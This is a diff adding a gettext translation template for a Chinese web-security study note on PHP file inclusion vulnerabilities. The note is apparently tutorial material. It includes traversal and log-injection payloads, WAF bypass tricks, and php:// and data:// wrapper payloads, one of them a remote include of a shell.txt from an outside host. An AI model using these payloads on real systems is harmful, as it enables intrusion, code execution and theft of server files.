@@ -1,0 +1,210 @@
+# SOME DESCRIPTIVE TITLE.
+# Copyright (C) 2019-2026, Lyle
+# This file is distributed under the same license as the Web安全学习笔记 package.
+# FIRST AUTHOR <EMAIL@ADDRESS>, 2026.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Report-Msgid-Bugs-To: \n"
+"POT-Creation-Date: 2026-06-17 07:02+0800\n"
+"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
+"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
+"Language: en\n"
+"Language-Team: en <LL@li.org>\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=utf-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Generated-By: Babel 2.18.0\n"
+
+#: ../../source/vuln/fileinclude.rst:2
+msgid "文件包含"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:5
+msgid "基础"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:6
+msgid "常见的文件包含漏洞的形式为 ``<?php include(\"inc/\" . $_GET['file']); ?>``"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:8
+msgid "考虑常用的几种包含方式为"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:10
+msgid "同目录包含 ``file=.htaccess``"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:11
+msgid "目录遍历 ``?file=../../../../../../../../../var/lib/locate.db``"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:12
+msgid "日志注入 ``?file=../../../../../../../../../var/log/apache/error.log``"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:13
+msgid "利用 ``/proc/self/environ``"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:15
+msgid "其中日志可以使用SSH日志或者Web日志等多种日志来源测试"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:18
+msgid "触发Sink"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:19
+msgid "PHP"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:20
+msgid "include"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:21
+msgid "在包含过程中出错会报错，不影响执行后续语句"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:22
+msgid "include_once"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:23
+msgid "仅包含一次"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:24
+msgid "require"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:25
+msgid "在包含过程中出错，就会直接退出，不执行后续语句"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:26
+msgid "require_once"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:30
+msgid "绕过技巧"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:31
+msgid "常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:34
+msgid "url编码绕过"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:35
+msgid "如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:38
+msgid "特殊字符绕过"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:39
+msgid "某些情况下，读文件支持使用Shell通配符，如 ``?`` ``*`` 等"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:40
+msgid "url中 使用 ``?`` ``#`` 可能会影响include包含的结果"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:41
+msgid "某些情况下，unicode编码不同但是字形相近的字符有同一个效果"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:44
+msgid "%00截断"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:45
+msgid "几乎是最常用的方法，条件是 ``magic_quotes_gpc`` 关闭，而且php版本小于5.3.4。"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:48
+msgid "长度截断"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:50
+msgid "Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:52
+msgid ""
+"msdn定义 ``#define MAX_PATH 260``，其中第260个字符为字符串结尾的 ``\\0`` "
+"，而linux可以用getconf来判断文件名长度限制和文件路径长度限制。"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:54
+msgid ""
+"获取最长文件路径长度：getconf PATH_MAX /root 得到4096 获取最长文件名：getconf NAME_MAX /root "
+"得到255"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:57
+msgid "那么在长度有限的时候，``././././`` (n个) 的形式就可以通过这个把路径爆掉"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:59
+msgid "在php代码包含中，这种绕过方式要求php版本 < php 5.2.8"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:62
+msgid "伪协议绕过"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:63
+msgid ""
+"远程包含: 要求 ``allow_url_fopen=On`` 且 ``allow_url_include=On`` ， payload为 "
+"``?file=[http|https|ftp]://websec.wordpress.com/shell.txt`` 的形式"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:64
+msgid ""
+"PHP input: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为"
+" ``?file=php://input`` 的形式"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:65
+msgid ""
+"Base64: 使用Base64伪协议读取文件，payload为 "
+"``?file=php://filter/convert.base64-encode/resource=index.php`` 的形式"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:66
+msgid ""
+"data: 使用data伪协议读取文件，payload为 "
+"``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 "
+"``allow_url_include=On``"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:69
+msgid "协议绕过"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:70
+msgid ""
+"``allow_url_fopen`` 和 ``allow_url_include`` 主要是针对 ``http`` ``ftp`` "
+"两种协议起作用，因此可以使用SMB、WebDav协议等方式来绕过限制。"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:73
+msgid "参考链接"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:74
+msgid "`Exploit with PHP Protocols <https://www.cdxy.me/?p=752>`_"
+msgstr ""
+
+#: ../../source/vuln/fileinclude.rst:75
+msgid "`lfi cheat sheet <https://highon.coffee/blog/lfi-cheat-sheet/>`_"
+msgstr ""
